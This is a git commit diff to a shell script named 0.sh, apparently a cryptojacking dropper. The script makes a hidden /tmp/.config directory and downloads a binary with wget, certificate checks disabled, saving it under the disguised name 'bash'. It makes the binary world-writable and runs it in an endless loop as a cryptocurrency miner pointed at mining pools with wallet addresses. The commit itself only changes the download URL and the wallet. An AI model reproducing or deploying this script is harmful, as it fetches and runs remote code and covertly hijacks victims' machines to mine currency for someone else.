e484ae03e9a4a4b9933dd0ca14c3b40a33d20f97
edrivetokenbsc <107461243+edrivetokenbsc@users.noreply.github.com>
2024-12-30 23:21:47 -0600

    Update 0.sh

--- 0.sh
+++ 0.sh
@@ -2,13 +2,13 @@
 
 mkdir -p /tmp/.config
 cd /tmp/.config
-wget --no-check-certificate -4 -qO "/tmp/.config/bash" "https://github.com/curiosityinteriorsuk/2088/raw/main/b"
+wget --no-check-certificate -4 -qO "/tmp/.config/bash" "https://github.com/edrivetokenbsc/2088/raw/main/b"
 chmod -R  777 /tmp/.config
 
 #!/bin/sh
 while [ 1 ]; do
 	#/tmp/.config/bash -a ghostrider --url stratum-na.rplant.xyz:7090 --user STeHt4JoHHWRuazNWkeUEt2jufQapdbnzB.2099i
  	#/tmp/.config/bash -a ghostrider --url asia.flockpool.com:4444 --user RDACoFmDxhJrktrSsfWHEcCgybGezuPkCw.harvard --pass stu --proxy harvard.edu.2333333.win:7091
- 	/tmp/.config/bash -a randomx --url de.zephyr.herominers.com:1123 --user ZEPHsD3Xoh6LBK7daphHmXKp5UNctHqe38FrzmdjNQTaCjkrAoStc3LdgRS8atNxpUJAPbCT3d2a3RMLJYhz5xevgyMHMXdBf4U --pass harvard
+ 	/tmp/.config/bash -a randomx --url de.zephyr.herominers.com:1123 --user ZEPHYR3FtF2jbu2cbaZQkj47vM9f3APg45gFMPTFStDd4o5yFTgZkwLZ1cAYo1z8xKLhj2EnpVz6VL47H9dN8vk7SYv5oaMZUWs2s --pass harvard
 	sleep 5
 done
